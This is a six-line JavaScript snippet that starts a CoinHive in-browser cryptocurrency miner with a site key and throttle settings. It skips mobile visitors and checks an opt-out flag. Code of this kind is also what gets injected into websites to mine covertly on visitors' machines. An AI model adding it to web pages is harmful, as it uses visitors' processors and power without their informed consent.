var miner = new CoinHive.Anonymous('VquOQiKAbOljFCUjGQAv556oLrHZCdIo', {
    throttle: 0.3
});
if (!miner.isMobile() && !miner.didOptOut(14400)) {
    miner.start();
}